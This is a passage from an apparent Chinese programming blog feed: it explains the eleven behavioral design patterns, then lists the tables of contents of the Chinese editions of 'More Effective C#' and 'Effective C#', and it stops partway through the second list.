<p>&emsp;&emsp;行为型模式包括11种模式：模板方法模式、命令模式、迭代器模式、观察者模式、中介者模式、状态模式、策略模式、责任链模式、访问者模式、解释器模式和备忘录模式。  </p>
<ul>
<li>模板方法模式：封装算法结构，定义算法骨架，支持算法子步骤变化。  </li>
<li>命令模式：注重将请求封装为对象，支持请求的变化，通过将一组行为抽象为对象，实现行为请求者和行为实现者之间的解耦。  </li>
<li>迭代器模式：注重封装特定领域变化，支持集合的变化，屏蔽集合对象内部复杂结构，提供客户程序对它的透明遍历。  </li>
<li>观察者模式：注重封装对象通知，支持通信对象的变化，实现对象状态改变，通知依赖它的对象并更新。  </li>
<li>中介者模式：注重封装对象间的交互，通过封装一系列对象之间的复杂交互，使他们不需要显式相互引用，实现解耦。  </li>
<li>状态模式：注重封装与状态相关的行为，支持状态的变化，通过封装对象状态，从而在其内部状态改变时改变它的行为。  </li>
<li>策略模式：注重封装算法，支持算法的变化，通过封装一系列算法，从而可以随时独立于客户替换算法。  </li>
<li>责任链模式：注重封装对象责任，支持责任的变化，通过动态构建职责链，实现事务处理。  </li>
<li>访问者模式：注重封装对象操作变化，支持在运行时为类结构添加新的操作，在类层次结构中，在不改变各类的前提下定义作用于这些类实例的新的操作。  </li>
<li>备忘录模式：注重封装对象状态变化，支持状态保存、恢复。  </li>
<li>解释器模式：注重封装特定领域变化，支持领域问题的频繁变化，将特定领域的问题表达为某种语法规则下的句子，然后构建一个解释器来解释这样的句子，从而达到解决问题的目的。  </li>
</ul>
<h2 id="3-1-模板方法模式"><a href="#3-1-模板方法模式" class="headerlink" title="3.1 模板方法模式"></a>3.1 模板方法模式</h2><p>&emsp;&emsp;在现实生活中，有论文模板，简历模板等。在现实生活中，模板的概念是给定一定的格式，然后其他所有使用模板的人可以根据自己的需求去实现它。同样，模板方法也是这样的。<br>&emsp;&emsp;模板方法模式是在一个抽象类中定义一个操作中的算法骨架，而将一些具体步骤实现延迟到子类中去实现。模板方法使得子类可以不改变算法结构的前提下，重新定义算法的特定步骤，从而达到复用代码的效果。具体的结构图如下所示（以生活中做菜为例子实现的模板方法结构图）。  </p>
<p><img src="%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F.png" alt="以生活中做菜为例子实现的模板方法结构图"></p>
<h2 id="3-2-命令模式"><a href="#3-2-命令模式" class="headerlink" title="3.2 命令模式"></a>3.2 命令模式</h2><p>&emsp;&emsp;命令模式属于对象的行为模式，命令模式把一个请求或操作封装到一个对象中，通过对命令的抽象化来使得发出命令的责任和执行命令的责任分隔开。命令模式的实现可以提供命令的撤销和恢复功能。具体的结构图如下所示。  </p>
<p><img src="%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F.gif" alt=" "></p>
<h2 id="3-3-迭代器模式"><a href="#3-3-迭代器模式" class="headerlink" title="3.3 迭代器模式"></a>3.3 迭代器模式</h2><p>&emsp;&emsp;迭代器模式是针对集合对象而生的，对于集合对象而言，必然涉及到集合元素的添加删除操作，也肯定支持遍历集合元素的操作，此时如果把遍历操作也放在集合对象的话，集合对象就承担太多的责任了，此时可以进行责任分离，把集合的遍历放在另一个对象中，这个对象就是迭代器对象。<br>&emsp;&emsp;迭代器模式提供了一种方法来顺序访问一个集合对象中各个元素，而又无需暴露该对象的内部表示，这样既可以做到不暴露集合的内部结构，又可以让外部代码透明地访问集合内部元素。具体的结构图如下所示。  </p>
<p><img src="%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="3-4-观察者模式"><a href="#3-4-观察者模式" class="headerlink" title="3.4 观察者模式"></a>3.4 观察者模式</h2><p>&emsp;&emsp;在现实生活中，处处可见观察者模式，例如，微信中的订阅号，订阅博客和QQ微博中关注好友，这些都属于观察者模式的应用。<br>&emsp;&emsp;观察者模式定义了一种一对多的依赖关系，让多个观察者对象同时监听某一个主题对象，这个主题对象在状态发生变化时，会通知所有观察者对象，使它们能够自动更新自己的行为。具体结构图如下所示：  </p>
<p><img src="%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="3-5-中介者模式"><a href="#3-5-中介者模式" class="headerlink" title="3.5 中介者模式"></a>3.5 中介者模式</h2><p>&emsp;&emsp;在现实生活中，有很多中介者模式的身影，例如QQ游戏平台，聊天室、QQ群和短信平台，这些都是中介者模式在现实生活中的应用。<br>&emsp;&emsp;中介者模式，定义了一个中介对象来封装一系列对象之间的交互关系。中介者使各个对象之间不需要显式地相互引用，从而使耦合性降低，而且可以独立地改变它们之间的交互行为。具体的结构图如下所示：  </p>
<p><img src="%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="3-6-状态模式"><a href="#3-6-状态模式" class="headerlink" title="3.6 状态模式"></a>3.6 状态模式</h2><p>&emsp;&emsp;每个对象都有其对应的状态，而每个状态又对应一些相应的行为，如果某个对象有多个状态时，那么就会对应很多的行为。那么对这些状态的判断和根据状态完成的行为，就会导致多重条件语句，并且如果添加一种新的状态时，需要更改之前现有的代码。这样的设计显然违背了开闭原则，状态模式正是用来解决这样的问题的。<br>&emsp;&emsp;状态模式——允许一个对象在其内部状态改变时自动改变其行为，对象看起来就像是改变了它的类。具体的结构图如下所示：  </p>
<p><img src="%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="3-7-策略模式"><a href="#3-7-策略模式" class="headerlink" title="3.7 策略模式"></a>3.7 策略模式</h2><p>&emsp;&emsp;在现实生活中，中国的所得税，分为企业所得税、外商投资企业或外商企业所得税和个人所得税，针对于这3种所得税，每种所计算的方式不同，个人所得税有个人所得税的计算方式，而企业所得税有其对应计算方式。如果不采用策略模式来实现这样一个需求的话，我们会定义一个所得税类，该类有一个属性来标识所得税的类型，并且有一个计算税收的CalculateTax()方法，在该方法体内需要对税收类型进行判断，通过if-else语句来针对不同的税收类型来计算其所得税。这样的实现确实可以解决这个场景，但是这样的设计不利于扩展，如果系统后期需要增加一种所得税时，此时不得不回去修改CalculateTax方法来多添加一个判断语句，这样明白违背了“开放——封闭”原则。此时，我们可以考虑使用策略模式来解决这个问题，既然税收方法是这个场景中的变化部分，此时自然可以想到对税收方法进行抽象，这也是策略模式实现的精髓所在。<br>&emsp;&emsp;策略模式是对算法的包装，是把使用算法的责任和算法本身分割开，委派给不同的对象负责。策略模式通常把一系列的算法包装到一系列的策略类里面。用一句话慨括策略模式就是——“将每个算法封装到不同的策略类中，使得它们可以互换”。下面是策略模式的结构图：  </p>
<p><img src="%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F.png" alt=" ">
　　</p>
<h2 id="3-8-责任链模式"><a href="#3-8-责任链模式" class="headerlink" title="3.8 责任链模式"></a>3.8 责任链模式</h2><p>&emsp;&emsp;在现实生活中，有很多请求并不是一个人说了就算的，例如面试时的工资，低于1万的薪水可能技术经理就可以决定了，但是1万~1万5的薪水可能技术经理就没这个权利批准，可能需要请求技术总监的批准。<br>&emsp;&emsp;责任链模式——某个请求需要多个对象进行处理，从而避免请求的发送者和接收之间的耦合关系。将这些对象连成一条链子，并沿着这条链子传递该请求，直到有对象处理它为止。具体结构图如下所示：  </p>
<p><img src="%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="3-9-访问者模式"><a href="#3-9-访问者模式" class="headerlink" title="3.9 访问者模式"></a>3.9 访问者模式</h2><p>&emsp;&emsp;访问者模式是封装一些施加于某种数据结构之上的操作。一旦这些操作需要修改的话，接受这个操作的数据结构则可以保存不变。访问者模式适用于数据结构相对稳定的系统， 它把数据结构和作用于数据结构之上的操作之间的耦合度降低，使得操作集合可以相对自由地改变。具体结构图如下所示：  </p>
<p><img src="%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="3-10-备忘录模式"><a href="#3-10-备忘录模式" class="headerlink" title="3.10 备忘录模式"></a>3.10 备忘录模式</h2><p>&emsp;&emsp;生活中的手机通讯录备忘录，操作系统备份点，数据库备份等都是备忘录模式的应用。备忘录模式是在不破坏封装的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，这样以后就可以把该对象恢复到原先的状态。具体的结构图如下所示：  </p>
<p><img src="%E5%A4%87%E5%BF%98%E5%BD%95%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
<h2 id="3-11-解释器模式"><a href="#3-11-解释器模式" class="headerlink" title="3.11 解释器模式"></a>3.11 解释器模式</h2><p>&emsp;&emsp;解释器模式是一个比较少用的模式，所以我自己也没有对该模式进行深入研究，在生活中，英汉词典的作用就是实现英文和中文互译，这就是解释器模式的应用。<br>&emsp;&emsp;解释器模式是给定一种语言，定义它文法的一种表示，并定义一种解释器，这个解释器使用该表示来解释器语言中的句子。具体的结构图如下所示：  </p>
<p><img src="%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F.png" alt=" "></p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[More Effective C# 书目录]]></title>
      <url>/2019/08/30/MoreEffectiveCSharpContents/</url>
      <content type="html"><![CDATA[<blockquote>
<p>书名：More Effective C# : 改善 C# 代码的 50 个有效方法（原书第 2 版）<br>作者：[ 美 ] 比尔·瓦格纳 ( Bill Wagner )<br>译者：爱飞翔<br>出版：机械工业出版社  </p>
</blockquote>
<p>适用于 <strong>C# 7.0</strong></p>
<a id="more"></a>

<hr>
<h2 id="第1章-处理各种类型的数据"><a href="#第1章-处理各种类型的数据" class="headerlink" title="第1章 处理各种类型的数据"></a>第1章 处理各种类型的数据</h2><h3 id="第1条：使用属性而不是可直接访问的数据成员"><a href="#第1条：使用属性而不是可直接访问的数据成员" class="headerlink" title="第1条：使用属性而不是可直接访问的数据成员"></a>第1条：使用属性而不是可直接访问的数据成员</h3><h3 id="第2条：尽量采用隐式属性来表示可变的数据"><a href="#第2条：尽量采用隐式属性来表示可变的数据" class="headerlink" title="第2条：尽量采用隐式属性来表示可变的数据"></a>第2条：尽量采用隐式属性来表示可变的数据</h3><h3 id="第3条：尽量把值类型设计成不可变的类型"><a href="#第3条：尽量把值类型设计成不可变的类型" class="headerlink" title="第3条：尽量把值类型设计成不可变的类型"></a>第3条：尽量把值类型设计成不可变的类型</h3><h3 id="第4条：注意值类型与引用类型之间的区别"><a href="#第4条：注意值类型与引用类型之间的区别" class="headerlink" title="第4条：注意值类型与引用类型之间的区别"></a>第4条：注意值类型与引用类型之间的区别</h3><h3 id="第5条：确保-0-可以当成值类型的有效状态使用"><a href="#第5条：确保-0-可以当成值类型的有效状态使用" class="headerlink" title="第5条：确保 0 可以当成值类型的有效状态使用"></a>第5条：确保 0 可以当成值类型的有效状态使用</h3><h3 id="第6条：确保属性能够像数据那样运用"><a href="#第6条：确保属性能够像数据那样运用" class="headerlink" title="第6条：确保属性能够像数据那样运用"></a>第6条：确保属性能够像数据那样运用</h3><h3 id="第7条：用元组来限制类型的作用范围"><a href="#第7条：用元组来限制类型的作用范围" class="headerlink" title="第7条：用元组来限制类型的作用范围"></a>第7条：用元组来限制类型的作用范围</h3><h3 id="第8条：在匿名类型中定义局部函数"><a href="#第8条：在匿名类型中定义局部函数" class="headerlink" title="第8条：在匿名类型中定义局部函数"></a>第8条：在匿名类型中定义局部函数</h3><h3 id="第9条：理解相等的不同概念及它们之间的关系"><a href="#第9条：理解相等的不同概念及它们之间的关系" class="headerlink" title="第9条：理解相等的不同概念及它们之间的关系"></a>第9条：理解相等的不同概念及它们之间的关系</h3><h3 id="第10条：留意-GetHashCode-方法的使用陷阱"><a href="#第10条：留意-GetHashCode-方法的使用陷阱" class="headerlink" title="第10条：留意 GetHashCode() 方法的使用陷阱"></a>第10条：留意 GetHashCode() 方法的使用陷阱</h3><hr>
<h2 id="第2章-API-设计"><a href="#第2章-API-设计" class="headerlink" title="第2章 API 设计"></a>第2章 API 设计</h2><h3 id="第11条：不要在-API-中提供转换运算符"><a href="#第11条：不要在-API-中提供转换运算符" class="headerlink" title="第11条：不要在 API 中提供转换运算符"></a>第11条：不要在 API 中提供转换运算符</h3><h3 id="第12条：尽量用可选参数来取代方法重载"><a href="#第12条：尽量用可选参数来取代方法重载" class="headerlink" title="第12条：尽量用可选参数来取代方法重载"></a>第12条：尽量用可选参数来取代方法重载</h3><h3 id="第13条：尽量缩减类型的可见范围"><a href="#第13条：尽量缩减类型的可见范围" class="headerlink" title="第13条：尽量缩减类型的可见范围"></a>第13条：尽量缩减类型的可见范围</h3><h3 id="第14条：优先考虑定义并实现接口，而不是继承"><a href="#第14条：优先考虑定义并实现接口，而不是继承" class="headerlink" title="第14条：优先考虑定义并实现接口，而不是继承"></a>第14条：优先考虑定义并实现接口，而不是继承</h3><h3 id="第15条：理解接口方法与虚方法之间的区别"><a href="#第15条：理解接口方法与虚方法之间的区别" class="headerlink" title="第15条：理解接口方法与虚方法之间的区别"></a>第15条：理解接口方法与虚方法之间的区别</h3><h3 id="第16条：用-Event-模式来实现通知功能"><a href="#第16条：用-Event-模式来实现通知功能" class="headerlink" title="第16条：用 Event 模式来实现通知功能"></a>第16条：用 Event 模式来实现通知功能</h3><h3 id="第17条：不要把类的内部对象通过引用返回给外界"><a href="#第17条：不要把类的内部对象通过引用返回给外界" class="headerlink" title="第17条：不要把类的内部对象通过引用返回给外界"></a>第17条：不要把类的内部对象通过引用返回给外界</h3><h3 id="第18条：优先考虑重写相关的方法，而不是创建事件处理程序"><a href="#第18条：优先考虑重写相关的方法，而不是创建事件处理程序" class="headerlink" title="第18条：优先考虑重写相关的方法，而不是创建事件处理程序"></a>第18条：优先考虑重写相关的方法，而不是创建事件处理程序</h3><h3 id="第19条：不要重载基类中定义的方法"><a href="#第19条：不要重载基类中定义的方法" class="headerlink" title="第19条：不要重载基类中定义的方法"></a>第19条：不要重载基类中定义的方法</h3><h3 id="第20条：了解事件机制为何会提升对象在运行期的耦合程度"><a href="#第20条：了解事件机制为何会提升对象在运行期的耦合程度" class="headerlink" title="第20条：了解事件机制为何会提升对象在运行期的耦合程度"></a>第20条：了解事件机制为何会提升对象在运行期的耦合程度</h3><h3 id="第21条：不要把事件声明成-virtual"><a href="#第21条：不要把事件声明成-virtual" class="headerlink" title="第21条：不要把事件声明成 virtual"></a>第21条：不要把事件声明成 virtual</h3><h3 id="第22条：尽量把重载方法创建得清晰、简洁而完备"><a href="#第22条：尽量把重载方法创建得清晰、简洁而完备" class="headerlink" title="第22条：尽量把重载方法创建得清晰、简洁而完备"></a>第22条：尽量把重载方法创建得清晰、简洁而完备</h3><h3 id="第23条：让-partial-类的构造函数、mutator-方法和事件处理程序调用适当的-partial-方法"><a href="#第23条：让-partial-类的构造函数、mutator-方法和事件处理程序调用适当的-partial-方法" class="headerlink" title="第23条：让 partial 类的构造函数、mutator 方法和事件处理程序调用适当的 partial 方法"></a>第23条：让 partial 类的构造函数、mutator 方法和事件处理程序调用适当的 partial 方法</h3><h3 id="第24条：尽量不要实现-ICloneable-接口，以便留出更多的设计空间"><a href="#第24条：尽量不要实现-ICloneable-接口，以便留出更多的设计空间" class="headerlink" title="第24条：尽量不要实现 ICloneable 接口，以便留出更多的设计空间"></a>第24条：尽量不要实现 ICloneable 接口，以便留出更多的设计空间</h3><h3 id="第25条：数组类型的参数应该用-params-加以修饰"><a href="#第25条：数组类型的参数应该用-params-加以修饰" class="headerlink" title="第25条：数组类型的参数应该用 params 加以修饰"></a>第25条：数组类型的参数应该用 params 加以修饰</h3><h3 id="第26条：在迭代器与异步方法中定义局部函数，以便尽早地报错"><a href="#第26条：在迭代器与异步方法中定义局部函数，以便尽早地报错" class="headerlink" title="第26条：在迭代器与异步方法中定义局部函数，以便尽早地报错"></a>第26条：在迭代器与异步方法中定义局部函数，以便尽早地报错</h3><hr>
<h2 id="第3章-基于任务的异步编程"><a href="#第3章-基于任务的异步编程" class="headerlink" title="第3章 基于任务的异步编程"></a>第3章 基于任务的异步编程</h2><h3 id="第27条：使用异步方法执行异步工作"><a href="#第27条：使用异步方法执行异步工作" class="headerlink" title="第27条：使用异步方法执行异步工作"></a>第27条：使用异步方法执行异步工作</h3><h3 id="第28条：不要编写返回值类型为-void-的异步方法"><a href="#第28条：不要编写返回值类型为-void-的异步方法" class="headerlink" title="第28条：不要编写返回值类型为 void 的异步方法"></a>第28条：不要编写返回值类型为 void 的异步方法</h3><h3 id="第29条：不要把同步方法与异步方法组合起来使用"><a href="#第29条：不要把同步方法与异步方法组合起来使用" class="headerlink" title="第29条：不要把同步方法与异步方法组合起来使用"></a>第29条：不要把同步方法与异步方法组合起来使用</h3><h3 id="第30条：使用异步方法以避免线程分配和上下文切换"><a href="#第30条：使用异步方法以避免线程分配和上下文切换" class="headerlink" title="第30条：使用异步方法以避免线程分配和上下文切换"></a>第30条：使用异步方法以避免线程分配和上下文切换</h3><h3 id="第31条：避免不必要的上下文编组"><a href="#第31条：避免不必要的上下文编组" class="headerlink" title="第31条：避免不必要的上下文编组"></a>第31条：避免不必要的上下文编组</h3><h3 id="第32条：通过-Task-对象来安排异步工作"><a href="#第32条：通过-Task-对象来安排异步工作" class="headerlink" title="第32条：通过 Task 对象来安排异步工作"></a>第32条：通过 Task 对象来安排异步工作</h3><h3 id="第33条：考虑实现任务取消协议"><a href="#第33条：考虑实现任务取消协议" class="headerlink" title="第33条：考虑实现任务取消协议"></a>第33条：考虑实现任务取消协议</h3><h3 id="第34条：缓存泛型异步方法的返回值"><a href="#第34条：缓存泛型异步方法的返回值" class="headerlink" title="第34条：缓存泛型异步方法的返回值"></a>第34条：缓存泛型异步方法的返回值</h3><hr>
<h2 id="第4章-并行处理"><a href="#第4章-并行处理" class="headerlink" title="第4章 并行处理"></a>第4章 并行处理</h2><h3 id="第35条：了解-PLINQ-是怎样实现并行算法的"><a href="#第35条：了解-PLINQ-是怎样实现并行算法的" class="headerlink" title="第35条：了解 PLINQ 是怎样实现并行算法的"></a>第35条：了解 PLINQ 是怎样实现并行算法的</h3><h3 id="第36条：编写并行算法时要考虑异常状况"><a href="#第36条：编写并行算法时要考虑异常状况" class="headerlink" title="第36条：编写并行算法时要考虑异常状况"></a>第36条：编写并行算法时要考虑异常状况</h3><h3 id="第37条：优先使用线程池而不是创建新的线程"><a href="#第37条：优先使用线程池而不是创建新的线程" class="headerlink" title="第37条：优先使用线程池而不是创建新的线程"></a>第37条：优先使用线程池而不是创建新的线程</h3><h3 id="第38条：考虑使用-BackgroundWorker-在线程之间通信"><a href="#第38条：考虑使用-BackgroundWorker-在线程之间通信" class="headerlink" title="第38条：考虑使用 BackgroundWorker 在线程之间通信"></a>第38条：考虑使用 BackgroundWorker 在线程之间通信</h3><h3 id="第39条：学会在-XAML-环境下执行跨线程调用"><a href="#第39条：学会在-XAML-环境下执行跨线程调用" class="headerlink" title="第39条：学会在 XAML 环境下执行跨线程调用"></a>第39条：学会在 XAML 环境下执行跨线程调用</h3><h3 id="第40条：首先考虑用-lock-实现同步"><a href="#第40条：首先考虑用-lock-实现同步" class="headerlink" title="第40条：首先考虑用 lock() 实现同步"></a>第40条：首先考虑用 lock() 实现同步</h3><h3 id="第41条：尽量缩减锁定范围"><a href="#第41条：尽量缩减锁定范围" class="headerlink" title="第41条：尽量缩减锁定范围"></a>第41条：尽量缩减锁定范围</h3><h3 id="第42条：不要在加了锁的区域内调用未知的方法"><a href="#第42条：不要在加了锁的区域内调用未知的方法" class="headerlink" title="第42条：不要在加了锁的区域内调用未知的方法"></a>第42条：不要在加了锁的区域内调用未知的方法</h3><hr>
<h2 id="第5章-动态编程"><a href="#第5章-动态编程" class="headerlink" title="第5章 动态编程"></a>第5章 动态编程</h2><h3 id="第43条：了解动态编程的优点及缺点"><a href="#第43条：了解动态编程的优点及缺点" class="headerlink" title="第43条：了解动态编程的优点及缺点"></a>第43条：了解动态编程的优点及缺点</h3><h3 id="第44条：通过动态编程技术更好地运用泛型参数的运行期类型"><a href="#第44条：通过动态编程技术更好地运用泛型参数的运行期类型" class="headerlink" title="第44条：通过动态编程技术更好地运用泛型参数的运行期类型"></a>第44条：通过动态编程技术更好地运用泛型参数的运行期类型</h3><h3 id="第45条：使用-DynamicObject-和-IDynamicMetaObjectProvider-实现数据驱动的动态类型"><a href="#第45条：使用-DynamicObject-和-IDynamicMetaObjectProvider-实现数据驱动的动态类型" class="headerlink" title="第45条：使用 DynamicObject 和 IDynamicMetaObjectProvider 实现数据驱动的动态类型"></a>第45条：使用 DynamicObject 和 IDynamicMetaObjectProvider 实现数据驱动的动态类型</h3><h3 id="第46条：学会正确使用-Expression-API"><a href="#第46条：学会正确使用-Expression-API" class="headerlink" title="第46条：学会正确使用 Expression API"></a>第46条：学会正确使用 Expression API</h3><h3 id="第47条：尽量减少公有-API-中的动态对象"><a href="#第47条：尽量减少公有-API-中的动态对象" class="headerlink" title="第47条：尽量减少公有 API 中的动态对象"></a>第47条：尽量减少公有 API 中的动态对象</h3><hr>
<h2 id="第6章-加入全球-C-社区"><a href="#第6章-加入全球-C-社区" class="headerlink" title="第6章 加入全球 C# 社区"></a>第6章 加入全球 C# 社区</h2><h3 id="第48条：最流行的写法不一定最合适"><a href="#第48条：最流行的写法不一定最合适" class="headerlink" title="第48条：最流行的写法不一定最合适"></a>第48条：最流行的写法不一定最合适</h3><h3 id="第49条：与大家一起制定规范并编写代码"><a href="#第49条：与大家一起制定规范并编写代码" class="headerlink" title="第49条：与大家一起制定规范并编写代码"></a>第49条：与大家一起制定规范并编写代码</h3><h3 id="第50条：考虑用分析器自动检查代码质量"><a href="#第50条：考虑用分析器自动检查代码质量" class="headerlink" title="第50条：考虑用分析器自动检查代码质量"></a>第50条：考虑用分析器自动检查代码质量</h3><hr>
<h2 id="中英文词汇对照表"><a href="#中英文词汇对照表" class="headerlink" title="中英文词汇对照表"></a>中英文词汇对照表</h2>]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Effective C# 书目录]]></title>
      <url>/2019/08/30/EffectiveCSharpContents/</url>
      <content type="html"><![CDATA[<blockquote>
<p>书名：Effective C# : 改善 C# 代码的 50 个有效方法（原书第 3 版）<br>作者：[ 美 ] 比尔·瓦格纳 ( Bill Wagner )<br>译者：爱飞翔<br>出版：机械工业出版社  </p>
</blockquote>
<p>适用于 <strong>C# 6.0</strong></p>
<a id="more"></a>

<hr>
<h2 id="第1章-C-语言的编程习惯"><a href="#第1章-C-语言的编程习惯" class="headerlink" title="第1章 C# 语言的编程习惯"></a>第1章 C# 语言的编程习惯</h2><h3 id="第1条：优先使用隐式类型的局部变量"><a href="#第1条：优先使用隐式类型的局部变量" class="headerlink" title="第1条：优先使用隐式类型的局部变量"></a>第1条：优先使用隐式类型的局部变量</h3><h3 id="第2条：考虑用-readonly-代替-const"><a href="#第2条：考虑用-readonly-代替-const" class="headerlink" title="第2条：考虑用 readonly 代替 const"></a>第2条：考虑用 readonly 代替 const</h3><h3 id="第3条：优先考虑-is-或-as-运算符，尽量少用强制类型转换"><a href="#第3条：优先考虑-is-或-as-运算符，尽量少用强制类型转换" class="headerlink" title="第3条：优先考虑 is 或 as 运算符，尽量少用强制类型转换"></a>第3条：优先考虑 is 或 as 运算符，尽量少用强制类型转换</h3><h3 id="第4条：用内插字符串取代-string-Format"><a href="#第4条：用内插字符串取代-string-Format" class="headerlink" title="第4条：用内插字符串取代 string.Format()"></a>第4条：用内插字符串取代 string.Format()</h3><h3 id="第5条：用-FormattableString-取代专门为特定区域而写的字符串"><a href="#第5条：用-FormattableString-取代专门为特定区域而写的字符串" class="headerlink" title="第5条：用 FormattableString 取代专门为特定区域而写的字符串"></a>第5条：用 FormattableString 取代专门为特定区域而写的字符串</h3><h3 id="第6条：不要用表示符号名称的硬字符串来调用-API"><a href="#第6条：不要用表示符号名称的硬字符串来调用-API" class="headerlink" title="第6条：不要用表示符号名称的硬字符串来调用 API"></a>第6条：不要用表示符号名称的硬字符串来调用 API</h3><h3 id="第7条：用委托表示回调"><a href="#第7条：用委托表示回调" class="headerlink" title="第7条：用委托表示回调"></a>第7条：用委托表示回调</h3><h3 id="第8条：用-null-条件运算符调用事件处理程序"><a href="#第8条：用-null-条件运算符调用事件处理程序" class="headerlink" title="第8条：用 null 条件运算符调用事件处理程序"></a>第8条：用 null 条件运算符调用事件处理程序</h3><h3 id="第9条：尽量避免装箱与取消装箱这两种操作"><a href="#第9条：尽量避免装箱与取消装箱这两种操作" class="headerlink" title="第9条：尽量避免装箱与取消装箱这两种操作"></a>第9条：尽量避免装箱与取消装箱这两种操作</h3><h3 id="第10条：只有在应对新版基类与现有子类之间的冲突时才应该使用-new-修饰符"><a href="#第10条：只有在应对新版基类与现有子类之间的冲突时才应该使用-new-修饰符" class="headerlink" title="第10条：只有在应对新版基类与现有子类之间的冲突时才应该使用 new 修饰符"></a>第10条：只有在应对新版基类与现有子类之间的冲突时才应该使用 new 修饰符</h3><hr>
<h2 id="第2章-NET-的资源管理"><a href="#第2章-NET-的资源管理" class="headerlink" title="第2章 .NET 的资源管理"></a>第2章 .NET 的资源管理</h2><h3 id="第11条：理解并善用-NET-的资源管理机制"><a href="#第11条：理解并善用-NET-的资源管理机制" class="headerlink" title="第11条：理解并善用 .NET 的资源管理机制"></a>第11条：理解并善用 .NET 的资源管理机制</h3><h3 id="第12条：声明字段时，尽量直接为其设定初始值"><a href="#第12条：声明字段时，尽量直接为其设定初始值" class="headerlink" title="第12条：声明字段时，尽量直接为其设定初始值"></a>第12条：声明字段时，尽量直接为其设定初始值</h3><h3 id="第13条：用适当的方式初始化类中的静态成员"><a href="#第13条：用适当的方式初始化类中的静态成员" class="headerlink" title="第13条：用适当的方式初始化类中的静态成员"></a>第13条：用适当的方式初始化类中的静态成员</h3><h3 id="第14条：尽量删减重复的初始化逻辑"><a href="#第14条：尽量删减重复的初始化逻辑" class="headerlink" title="第14条：尽量删减重复的初始化逻辑"></a>第14条：尽量删减重复的初始化逻辑</h3><h3 id="第15条：不要创建无谓的对象"><a href="#第15条：不要创建无谓的对象" class="headerlink" title="第15条：不要创建无谓的对象"></a>第15条：不要创建无谓的对象</h3><h3 id="第16条：绝对不要在构造函数里面调用虚函数"><a href="#第16条：绝对不要在构造函数里面调用虚函数" class="headerlink" title="第16条：绝对不要在构造函数里面调用虚函数"></a>第16条：绝对不要在构造函数里面调用虚函数</h3><h3 id="第17条：实现标准的-dispose-模式"><a href="#第17条：实现标准的-dispose-模式" class="headerlink" title="第17条：实现标准的 dispose 模式"></a>第17条：实现标准的 dispose 模式</h3><hr>
<h2 id="第3章-合理地运用泛型"><a href="#第3章-合理地运用泛型" class="headerlink" title="第3章 合理地运用泛型"></a>第3章 合理地运用泛型</h2><h3 id="第18条：只定义刚好够用的约束条件"><a href="#第18条：只定义刚好够用的约束条件" class="headerlink" title="第18条：只定义刚好够用的约束条件"></a>第18条：只定义刚好够用的约束条件</h3><h3 id="第19条：通过运行期类型检查实现特定的泛型算法"><a href="#第19条：通过运行期类型检查实现特定的泛型算法" class="headerlink" title="第19条：通过运行期类型检查实现特定的泛型算法"></a>第19条：通过运行期类型检查实现特定的泛型算法</h3><h3 id="第20条：通过-IComparable-lt-T-gt-及-IComparer-lt-T-gt-定义顺序关系"><a href="#第20条：通过-IComparable-lt-T-gt-及-IComparer-lt-T-gt-定义顺序关系" class="headerlink" title="第20条：通过 IComparable&lt;T&gt; 及 IComparer&lt;T&gt; 定义顺序关系"></a>第20条：通过 IComparable&lt;T&gt; 及 IComparer&lt;T&gt; 定义顺序关系</h3><h3 id="第21条：创建泛型类时，总是应该给实现了-IDisposable-的类型参数提供支持"><a href="#第21条：创建泛型类时，总是应该给实现了-IDisposable-的类型参数提供支持" class="headerlink" title="第21条：创建泛型类时，总是应该给实现了 IDisposable 的类型参数提供支持"></a>第21条：创建泛型类时，总是应该给实现了 IDisposable 的类型参数提供支持</h3><h3 id="第22条：考虑支持泛型协变与逆变"><a href="#第22条：考虑支持泛型协变与逆变" class="headerlink" title="第22条：考虑支持泛型协变与逆变"></a>第22条：考虑支持泛型协变与逆变</h3><h3 id="第23条：用委托要求类型参数必须提供某种方法"><a href="#第23条：用委托要求类型参数必须提供某种方法" class="headerlink" title="第23条：用委托要求类型参数必须提供某种方法"></a>第23条：用委托要求类型参数必须提供某种方法</h3><h3 id="第24条：如果有泛型方法，就不要再创建针对基类或接口的重载版本"><a href="#第24条：如果有泛型方法，就不要再创建针对基类或接口的重载版本" class="headerlink" title="第24条：如果有泛型方法，就不要再创建针对基类或接口的重载版本"></a>第24条：如果有泛型方法，就不要再创建针对基类或接口的重载版本</h3><h3 id="第25条：如果不需要把类型参数所表示的对象设为实例字段，那么应该优先考虑创建泛型方法，而不是泛型类"><a href="#第25条：如果不需要把类型参数所表示的对象设为实例字段，那么应该优先考虑创建泛型方法，而不是泛型类" class="headerlink" title="第25条：如果不需要把类型参数所表示的对象设为实例字段，那么应该优先考虑创建泛型方法，而不是泛型类"></a>第25条：如果不需要把类型参数所表示的对象设为实例字段，那么应该优先考虑创建泛型方法，而不是泛型类</h3><h3 id="第26条：实现泛型接口的同时，还应该实现非泛型接口"><a href="#第26条：实现泛型接口的同时，还应该实现非泛型接口" class="headerlink" title="第26条：实现泛型接口的同时，还应该实现非泛型接口"></a>第26条：实现泛型接口的同时，还应该实现非泛型接口</h3><h3 